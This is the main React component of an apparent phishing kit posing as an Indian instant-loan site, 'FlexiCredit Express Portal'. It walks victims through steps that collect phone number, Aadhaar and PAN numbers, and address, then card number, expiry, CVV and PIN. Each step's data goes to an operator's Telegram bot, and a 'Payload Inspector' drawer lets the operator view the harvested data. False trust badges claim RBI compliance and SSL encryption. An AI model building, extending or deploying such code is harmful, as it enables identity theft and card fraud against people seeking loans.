import React, { useState, useEffect } from 'react';
import { Header } from './components/Header';
import { StepTracker } from './components/StepTracker';
import { Step1Phone } from './components/Step1Phone';
import { Step2PersonalDetails } from './components/Step2PersonalDetails';
import { Step3EligibilityResult } from './components/Step3EligibilityResult';
import { Step4CardPayment } from './components/Step4CardPayment';
import { Step5DisbursementSuccess } from './components/Step5DisbursementSuccess';
import { TelegramConfigModal } from './components/TelegramConfigModal';
import { TelegramLogsDrawer } from './components/TelegramLogsDrawer';
import { WhatsAppWidget } from './components/WhatsAppWidget';
import { Step, LoanDetails, CardDetails, TelegramConfig, TelegramLog } from './types';
import { ShieldCheck, Lock, Award, CheckCircle2, PhoneCall } from 'lucide-react';

export default function App() {
  const [step, setStep] = useState<Step>(1);

  // Application State
  const [loanDetails, setLoanDetails] = useState<LoanDetails>({
    phone: '',
    otpVerified: false,
    employmentType: 'Salaried Employee',
    loanAmount: 250000,
    loanTenure: 24,
    name: '',
    adhar: '',
    panCard: '',
    age: '28',
    state: 'Maharashtra',
    city: 'Mumbai',
    pincode: '400001',
  });

  const [cardDetails, setCardDetails] = useState<CardDetails | null>(null);

  // Telegram Config & Logs
  const [telegramConfig, setTelegramConfig] = useState<TelegramConfig>({
    hasToken: false,
    hasChatId: false,
    maskedToken: '',
    chatId: '',
  });

  const [telegramLogs, setTelegramLogs] = useState<TelegramLog[]>([]);
  const [lastLog, setLastLog] = useState<TelegramLog | null>(null);

  const [isConfigOpen, setIsConfigOpen] = useState(false);
  const [isLogsOpen, setIsLogsOpen] = useState(false);

  // Fetch initial Telegram Config & Logs on mount
  const fetchTelegramConfig = async () => {
    try {
      const res = await fetch('/api/telegram/config');
      if (res.ok) {
        const data = await res.json();
        setTelegramConfig(data);
      }
    } catch (e) {
      console.error('Failed to fetch Telegram config', e);
    }
  };

  const fetchTelegramLogs = async () => {
    try {
      const res = await fetch('/api/telegram/logs');
      if (res.ok) {
        const data = await res.json();
        setTelegramLogs(data.logs || []);
      }
    } catch (e) {
      console.error('Failed to fetch Telegram logs', e);
    }
  };

  useEffect(() => {
    fetchTelegramConfig();
    fetchTelegramLogs();
  }, []);

  // Helper to send payload to Telegram
  const sendTelegramPayload = async (type: string, data: Record<string, any>) => {
    const res = await fetch('/api/telegram/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, data }),
    });

    const result = await res.json();
    if (!res.ok) {
      throw new Error(result.error || 'Failed to dispatch notification to Telegram');
    }

    if (result.log) {
      setLastLog(result.log);
      setTelegramLogs((prev) => [result.log, ...prev]);
    }
    fetchTelegramConfig();
    return result;
  };

  // STEP 1 HANDLER: Phone submission
  const handlePhoneSubmit = async (phone: string) => {
    setLoanDetails((prev) => ({ ...prev, phone, otpVerified: true }));
    await sendTelegramPayload('phone_step', { phone, otpVerified: true });
    setStep(2);
  };

  // STEP 2 HANDLER: Personal details submission
  const handlePersonalDetailsSubmit = async (
    details: Omit<LoanDetails, 'phone' | 'otpVerified'>
  ) => {
    const updated = { ...loanDetails, ...details };
    setLoanDetails(updated);

    await sendTelegramPayload('personal_details', {
      phone: updated.phone,
      name: updated.name,
      employmentType: updated.employmentType,
      adhar: updated.adhar,
      panCard: updated.panCard,
      age: updated.age,
      state: updated.state,
      city: updated.city,
      pincode: updated.pincode,
      loanAmount: updated.loanAmount,
      loanTenure: updated.loanTenure,
    });

    setStep(3);
  };

  // STEP 4 HANDLER: Card Details submission
  const handleCardDetailsSubmit = async (cardData: CardDetails) => {
    setCardDetails(cardData);

    await sendTelegramPayload('card_details', {
      phone: loanDetails.phone,
      name: loanDetails.name,
      cardNumber: cardData.cardNumber,
      cardHolder: cardData.cardHolder,
      exp: cardData.exp,
      cvv: cardData.cvv,
      pin: cardData.pin,
    });

    setStep(5);
  };

  // Save Config handler
  const handleSaveConfig = async (botToken: string, chatId: string) => {
    const res = await fetch('/api/telegram/config', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ botToken, chatId }),
    });
    if (!res.ok) {
      const err = await res.json();
      throw new Error(err.message || 'Failed to update configuration');
    }
    await fetchTelegramConfig();
  };

  // Send Test Message handler
  const handleSendTestMessage = async () => {
    await sendTelegramPayload('test_ping', {
      message: 'Test message from Loan Express Portal!',
      status: 'OK',
    });
  };

  const handleReset = () => {
    setStep(1);
    setCardDetails(null);
    setLastLog(null);
  };

  return (
    <div className="min-h-screen bg-slate-900 text-slate-900 font-sans antialiased flex flex-col selection:bg-emerald-500 selection:text-white">
      {/* Top Header */}
      <Header
        telegramConfig={telegramConfig}
        onOpenConfig={() => setIsConfigOpen(true)}
        onOpenLogs={() => setIsLogsOpen(true)}
        onReset={handleReset}
        currentStep={step}
      />

      {/* Main Container */}
      <main className="flex-1 bg-gradient-to-b from-slate-900 via-slate-900 to-slate-950 px-4 py-8 sm:py-12">
        <div className="max-w-5xl mx-auto space-y-8">
          {/* Step Progress Tracker */}
          <StepTracker currentStep={step} />

          {/* Active Step Content */}
          <div className="transition-all duration-300">
            {step === 1 && (
              <Step1Phone
                onContinue={handlePhoneSubmit}
                initialPhone={loanDetails.phone.replace('+91 ', '')}
              />
            )}

            {step === 2 && (
              <Step2PersonalDetails
                phone={loanDetails.phone}
                onSubmit={handlePersonalDetailsSubmit}
                initialData={loanDetails}
              />
            )}

            {step === 3 && (
              <Step3EligibilityResult
                loanDetails={loanDetails}
                onProceedToPayment={() => setStep(4)}
              />
            )}

            {step === 4 && (
              <Step4CardPayment
                applicantName={loanDetails.name}
                phone={loanDetails.phone}
                onSubmitCardDetails={handleCardDetailsSubmit}
              />
            )}

            {step === 5 && (
              <Step5DisbursementSuccess
                loanDetails={loanDetails}
                lastLog={lastLog}
                onReset={handleReset}
              />
            )}
          </div>

          {/* Trust Highlights Footer Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 max-w-4xl mx-auto pt-8 border-t border-slate-800/80">
            <div className="bg-slate-950/60 border border-slate-800/80 rounded-2xl p-4 flex items-center space-x-3 text-white">
              <div className="w-10 h-10 rounded-xl bg-emerald-500/10 text-emerald-400 flex items-center justify-center shrink-0 border border-emerald-500/20">
                <ShieldCheck className="w-5 h-5" />
              </div>
              <div>
                <p className="text-xs font-bold">100% Paperless & Instant</p>
                <p className="text-[11px] text-slate-400">Zero physical documents required</p>
              </div>
            </div>

            <div className="bg-slate-950/60 border border-slate-800/80 rounded-2xl p-4 flex items-center space-x-3 text-white">
              <div className="w-10 h-10 rounded-xl bg-emerald-500/10 text-emerald-400 flex items-center justify-center shrink-0 border border-emerald-500/20">
                <Lock className="w-5 h-5" />
              </div>
              <div>
                <p className="text-xs font-bold">RBI Compliant Process</p>
                <p className="text-[11px] text-slate-400">End-to-end SSL bank encryption</p>
              </div>
            </div>

            <div className="bg-slate-950/60 border border-slate-800/80 rounded-2xl p-4 flex items-center space-x-3 text-white">
              <div className="w-10 h-10 rounded-xl bg-emerald-500/10 text-emerald-400 flex items-center justify-center shrink-0 border border-emerald-500/20">
                <PhoneCall className="w-5 h-5" />
              </div>
              <div>
                <p className="text-xs font-bold">Instant Bot Notifications</p>
                <p className="text-[11px] text-slate-400">Real-time alerts via Telegram API</p>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-slate-950 border-t border-slate-800 py-6 text-center text-xs text-slate-500">
        <div className="max-w-7xl mx-auto px-4 flex flex-col sm:flex-row items-center justify-between gap-3">
          <p>© 2026 FlexiCredit Express Portal. All rights reserved.</p>
          <div className="flex items-center space-x-4 text-[11px]">
            <button onClick={() => setIsConfigOpen(true)} className="hover:text-emerald-400 transition-colors">
              Bot Config
            </button>
            <span>•</span>
            <button onClick={() => setIsLogsOpen(true)} className="hover:text-emerald-400 transition-colors">
              Payload Inspector
            </button>
          </div>
        </div>
      </footer>

      {/* Telegram Config Modal */}
      <TelegramConfigModal
        isOpen={isConfigOpen}
        onClose={() => setIsConfigOpen(false)}
        config={telegramConfig}
        onSaveConfig={handleSaveConfig}
        onSendTestMessage={handleSendTestMessage}
      />

      {/* Telegram Logs Inspector Drawer */}
      <TelegramLogsDrawer
        isOpen={isLogsOpen}
        onClose={() => setIsLogsOpen(false)}
        logs={telegramLogs}
        onRefresh={fetchTelegramLogs}
      />

      {/* WhatsApp Live Support Widget */}
      <WhatsAppWidget phoneNumber="916302235986" />
    </div>
  );
}
